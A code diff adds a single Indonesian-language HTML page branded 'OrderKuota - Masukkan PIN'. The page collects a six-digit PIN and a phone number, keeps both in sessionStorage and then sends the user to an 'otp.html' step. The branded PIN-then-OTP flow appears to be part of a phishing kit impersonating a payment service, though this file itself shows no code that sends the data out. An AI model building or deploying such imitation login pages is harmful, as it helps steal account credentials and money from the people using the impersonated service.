@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OrderKuota - Masukkan PIN</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(180deg, #14532d, #22c55e);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #fff;
+    }
+    .container {
+      background: #14532d;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
+      width: 320px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    .pin-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+    .pin-inputs input {
+      width: 40px;
+      height: 50px;
+      text-align: center;
+      font-size: 22px;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+    }
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #22c55e;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background: #16a34a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Masukkan PIN & Nomor Telepon</h2>
+    <form id="pinForm">
+      <div class="pin-inputs">
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+      </div>
+      <input type="tel" id="phone" placeholder="Masukkan Nomor Telepon" required />
+      <button class="btn" type="submit">Lanjut</button>
+    </form>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll(".pin-inputs input");
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+    });
+
+    const form = document.getElementById("pinForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const pin = Array.from(inputs).map(i => i.value).join("");
+      const phone = document.getElementById("phone").value;
+
+      // Simpan ke sessionStorage
+      sessionStorage.setItem("pin", pin);
+      sessionStorage.setItem("phone", phone);
+
+      // Lanjut ke halaman OTP
+      window.location.href = "otp.html";
+    });
+  </script>
+</body>
+</html>
